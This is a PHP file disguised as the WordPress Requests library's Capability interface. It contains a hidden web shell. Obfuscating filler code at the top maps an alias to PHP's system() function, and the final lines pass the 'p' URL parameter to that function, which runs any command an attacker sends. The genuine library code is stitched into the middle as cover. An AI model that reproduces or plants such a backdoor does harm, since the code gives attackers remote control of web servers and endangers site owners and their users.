<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Capability interface declaring the known capabilities.
 *
 * @package Requests\Utilities
 */

namespace WpOrg\Requests;

/**
 * Capability interface declaring the known capabilities.
 *
 * This is used as the authoritative source for which capabilities can be queried.
 *
 * @package Requests\Utilities
 */
interface Capability {

	/**
	 * Support for SSL.
	 *
	 * @var string
	 */
	const SSL = 'ssl';

	/**
	 * Collection of all capabilities supported in Requests.
	 *
	 * Note: this does not automatically mean that the capability will be supported for your chosen transport!
	 *
	 * @var string[]
	 */
	const ALL = [
		self::SSL,
	];
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>